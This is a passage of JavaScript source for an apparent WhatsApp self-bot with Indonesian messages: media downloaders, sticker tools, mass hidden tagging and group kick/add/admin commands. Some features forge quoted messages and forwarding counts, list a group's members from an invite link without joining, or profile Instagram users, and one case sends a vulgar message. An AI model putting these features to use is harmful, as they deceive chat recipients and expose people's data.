          	if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
  hexa.sendMessage(from,'「 *𝑺𝑬𝑳𝑭 - 𝑴𝑶𝑫𝑬* 」', text, {quoted:ftroli, contextInfo: { externalAdReply: { title: '𝙭ȿͥt͢aͣrͫs𠒎𠐓', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/fino.jpeg'), sourceUrl: 'https://wa.me/50587753432'}}})
          	break
 	case 'hidetag':

			
			var value = args.join(' ')
			var group = await hexa.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: ftroli
			}
			hexa.sendMessage(from, optionshidetag, text)
			break
	case 'play':
const axios5 = require('axios')
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios5.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break  
        case 'video':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break      
    case 'sticker': 
    case 'stiker':
    case 'sg':
    case 's':
 
            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await hexa.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Berhasil gan')
                hexa.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Berhasil gan')
            hexa.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
            }
            break               
    case 'toimg':
			if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await hexa.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	case 'ytsearch':
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await hexa.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	case 'setreply':
	case 'setfake':
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await hexa.downloadMediaMessage(boij)
			fs.writeFileSync(`./lib/image/cecan.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'setthumb':
	        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await hexa.downloadMediaMessage(boij)
			fs.writeFileSync(`./lib/image/fino.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
      case "play2":
        if (!isUrl(args[0]) && !args[0].includes("youtu"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/youtube/video?url=${args[0]}`
        );
        var b = bv.result.creator_metadata;
        var tamnel = await getBuffer(bv.result.media_resources.thumbnail);
        var a = bv.result.media_metadata;
        sendButImage(
          from,
          `*Name channel*: ${b.name}\n📜 *Title*: ${a.title}\n❤️ *Like*: ${a.totalLikes}\n👎 *Dislike*: ${a.totalDislikes}\n🎞️ *Views*: ${a.totalViews}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}ytdl ${args[0]}|video`,
              buttonText: {
                displayText: `VIDEO`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}ytdl ${args[0]}|music`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
          ]
        );
        break;
	case 'ytmp4':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
			let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks2) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				ytv(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
				if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
				const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captionsYtmp4)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})		
				})
				} catch (err) {
			    reply(mess.error.api)
				}
				break
	case 'emoji':
			if (!q) return fakegroup('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
	case 'ytmp3':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
				const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break
    case 'image':
            if (args.length < 1) return reply('Masukan teks!')
            const gimg = args.join('');
            reply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            hexa.sendMessage(from,{url:images},image,{quoted:ftroli})
            });
            break
 	case 'tiktok':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		console.log(result)
    		const { videonowm, videonowm2, text } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${videonowm2}`)
    		.then(async (a) => {
    		me = `*Title* : ${text}\n*Link* : ${a.data}`
		hexa.sendMessage(from,{url:`${videonowm}`},video,{mimetype:'video/mp4',quoted:ftroli,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
    case 'tiktokaudio':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
 		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		const { music,text } = result
		hexa.sendMessage(from,{url:`${music}`},audio,{mimetype:'audio/mp4',filename : `${text}`,quoted:ftroli})
		})
     		.catch(e => console.log(e))
     		break
case "tiktok3":
        if(!q) return ('Silahkan ulangi dan tambahkan link tiktok')
        if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${args[0]}`
        );
        var b = bv.result.author_metadata;
        var tamnel = await getBuffer(
          bv.result.media_resources.image.contentUrl
        );
        var a = bv.result.media_metadata;
        l(
          from,
          `▢ *Nickname*: ${b.username}\n▢ *Like*: ${a.stats.diggCount}\n▢ *Komentar*: ${a.stats.commentCount}\n▢ *Share*: ${a.stats.shareCount}\n▢ *Views*: ${a.stats.playCount}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}tiktokdl ${args[0]}|video`,
              buttonText: {
                displayText: `MP3`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}tiktokdl ${args[0]}|audio`,
              buttonText: {
                displayText: `MP4`,
              },
              type: 1,
            },
          ]
        );
        break  
case "tiktokdl":
        if(!isVerify) return isUser()
        var gh = body.slice(10)
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${link}`
        );
        if (tipe == "audio") {
          sendMediaURL(from, bv.result.media_resources.music.playUrl, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.video.videoUrl, "");
        }
        break
    case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			hexa.sendMessage(from, teks, text,{quoted:ftroli,detectLinks: false})                        
            })              
			break
    case 'ig':
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return fakegroup('Linknya?')
        reply(mess.wait)
	    igdl(args[0])
	    .then(async(result) => {
            for (let ink of result.url_list)	{
            if (ink.includes('.mp4')){
            const igvdl = await getBuffer(ink)	
	    hexa.sendMessage(from,igvdl,video,{mimetype:'video/mp4',quoted:ftroli,caption:'Nih'})
            } else if (ink.includes('.jpg')){
            const igpdl = await getBuffer(ink)
            hexa.sendMessage(from,igpdl,image,{mimetype:'image/jpeg',quoted:ftroli,caption:'Nih'})
	    }
            }
	    })
	    break
    case 'igstalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.following}\n*Following* : ${Y.followers}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
    case 'fb':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply(mess.wait)
            te = args.join(' ')
            fakestatus(mess.wait)
            Fb.getInfo(`${te}`)
            .then(G => {
            ten = `${G.download.sd}`
            tek = `${G.title}`
            sendMediaURL(from,ten,`*Title* : ${tek}\n\n*Link* : ${ten}`)
            })
            break    

    case 'join':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return fakestatus('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
            var response = await hexa.acceptInvite(codeInvite)
            fakestatus('SUKSES')
            } catch {
            fakegroup('LINK ERROR!')
            }
            break
    case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await twitterGetUrl(`${ten}`)
            .then(g => {
            ren = `${g.download[2].url}`
            sendMediaURL(from,ren,'DONE')
            })
            break
    case 'runtime':
    case 'test':
     case 'hidup':
 hexa.updatePresence(from, Presence.recording)
            run = process.uptime() 
            teks = `${kyun(run)}`
   hexa.sendMessage(from, teks, text, {quoted:ftroli,sendEphemeral:true, "forwardingScore":99999999,"isForwarded":true, contextInfo: {externalAdReply: { title: 'ìąʍ ƒìղօ 菲诺', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/cecan.jpeg'), sourceUrl: ''}}})
            break  
    case 'totag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'tomp4':
     case 'tovid':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await hexa.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break
    case 'tourl':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await hexa.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break	
    case 'inspect':
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await hexa.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split("@")[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split("@")[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split("@")[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             hexa.sendMessage(from,par,text,{quoted:ftroli,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
case 'kick2':
case 'hedcot':
 case 'hedshot':
    if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
					if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
					entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (entah.length > 1) {
					var mems_ids = []
					for (let ids of entah) {
					mems_ids.push(ids)
					}
					hexa.groupRemove(from, mems_ids)
                           
					} else {
                                
					hexa.groupRemove(from, [nomor[0]])
                          
					}
                        
					} else {
                           
					entah = mek.message.extendedTextMessage.contextInfo.participant
                            
					hexa.groupRemove(from, [entah])
                        
					}
                        
					break
case 'add2':
     if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
                        
					if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
                            
					entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
                            
					if (entah.length > 1) {
                                
					var mems_ids = []
                                
					for (let ids of entah) {
                                    
					mems_ids.push(ids)
                                
					}
                                
					hexa.groupAdd(from, mems_ids)
                           
					} else {
                                
					hexa.groupAdd(from, [nomor[0]])
                          
					}
                        
					} else {
                           
					entah = mek.message.extendedTextMessage.contextInfo.participant
                            
					hexa.groupAdd(from, [entah])
                        
					}
                        
					break
case 'promote2':
 case 'pm2':
  case 'pm':
     if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
                        
					if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
                            
					entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
                            
					if (entah.length > 1) {
                                
					var mems_ids = []
                                
					for (let ids of entah) {
                                    
					mems_ids.push(ids)
                                
					}
                                
					hexa.groupMakeAdmin(from, mems_ids)
                           
					} else {
                                
					hexa.groupMakeAdmin(from, [nomor[0]])
                          
					}
                        
					} else {
                           
					entah = mek.message.extendedTextMessage.contextInfo.participant
                            
					hexa.groupMakeAdmin(from, [entah])
                        
					}
                        
					break
case 'demote2':
 case 'dm':
  case 'dm2':
      if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
                        
					if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
                            
					entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
                            
					if (entah.length > 1) {
                                
					var mems_ids = []
                                
					for (let ids of entah) {
                                    
					mems_ids.push(ids)
                                
					}
                                
					hexa.groupDemoteAdmin(from, mems_ids)
                           
					} else {
                                
					hexa.groupDemoteAdmin(from, [nomor[0]])
                          
					}
                        
					} else {
                           
					entah = mek.message.extendedTextMessage.contextInfo.participant
                            
					hexa.groupDemoteAdmin(from, [entah])
                        
					}
                        
					break
case 'pino' :
 case 'fino':
  case 'ganteng':
 var bitch = hexa.prepareMessageFromContent(from, {
				"listMessage":{
			  "title": `kontol`,
			  "description": `P kntol`,
			  "buttonText": "Tes",
			  "listType": "SINGLE_SELECT",
			  "sections": [
			     {
			        "rows": [
			           {
			              "title": "1",
			              "rowId": ``
			           },
			           {
			              "title": "2",
			              "rowId": ``,
			           }
			        ]
			     }]}}, {}) 
			hexa.relayWAMessage(bitch)
			break
case "antilink":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntilink) return reply("Sudah aktif!!");
          antilink.push(from);
          fs.writeFileSync(
            "./lib/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mengaktifkan antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./lib/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mematikan antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;

case 'hidetag':
        if (!mek.key.fromMe) return reply('SELF-BOT')
                var value = body.slice(8)
                var group = await hexa.groupMetadata(from)
                var member = group['participants']
                var mem = []
                member.map( async adm => {
                mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                text: value,
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
                }
                hexa.sendMessage(from, options, text)
                await limitAdd(sender)
                break
case 'tag': 					              				          
   case 'mention': 					              				          
					texxt = args.join(' ')
   hexa.sendMessage(from, texxt, text, {
   quoted: mek,
    contextInfo: {
      mentionedJid: hexa.parseMention(texxt)
    }
  })
					break
case 'demote':
     if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Tag target yang ingin di turunkan admin group!*')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `*Perintah diterima, menurunkan jadi admin group* :\n`
							teks += `@_.split("@")[0]`
						}
						mentions(teks, mentioned, true)
						hexa.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`*Perintah diterima, menurunkan* @${mentioned[0].split("@")[0]} *jadi admin group*`, mentioned, true)
						hexa.groupDemoteAdmin(from, mentioned)
					}
					break
			case 'promote':
     if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Tag target yang ingin di jadikan admin group!*')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `*Selamat* 🥳 *Anda naik menjadi admin group* 🎉 :\n`
							teks += `@_.split("@")[0]`
						}
						mentions(teks, mentioned, true)
						hexa.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`*Selamat* 🥳 @${mentioned[0].split("@")[0]} *Anda naik menjadi admin group* 🎉`, mentioned, true)
						hexa.groupMakeAdmin(from, mentioned)
					}
					break
case 'kick':
 if (!mek.key.fromMe) return reply('SELF-BOT')
